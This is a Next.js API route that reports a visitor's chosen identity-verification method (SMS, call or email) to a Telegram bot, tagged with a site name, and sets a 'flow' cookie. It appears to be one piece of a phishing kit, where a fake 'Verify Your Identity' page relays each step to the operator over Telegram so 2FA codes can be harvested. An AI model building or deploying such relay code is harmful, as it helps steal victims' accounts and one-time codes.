import { NextResponse } from 'next/server';
import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';

const METHOD_LABELS = {
  text: 'Text Message (SMS)',
  call: 'Phone Call',
  email: 'Email',
};

function escapeHtml(s) {
  if (typeof s !== 'string') return '';
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export async function POST(request) {
  try {
    const body = await request.json().catch(() => ({}));
    const method = String(body.method ?? 'text').toLowerCase();
    const label = METHOD_LABELS[method] || method || 'Unknown';

    const message = [
      `🏷 Site: ${escapeHtml(getSiteName())}`,
      '',
      '🔐 <b>Verify Your Identity</b>',
      '━━━━━━━━━━━━━━━━━━',
      '',
      `Method Selected: ${escapeHtml(label)}`,
    ].join('\n');

    await sendTelegramMessage(wrapFlowMessage(message));
    const res = NextResponse.json({ ok: true });
    res.cookies.set('flow', 'verify', { path: '/', maxAge: 600, httpOnly: true, sameSite: 'lax' });
    return res;
  } catch (err) {
    console.error('notify-2fa-method:', err);
    return NextResponse.json({ error: 'Notification failed' }, { status: 503 });
  }
}
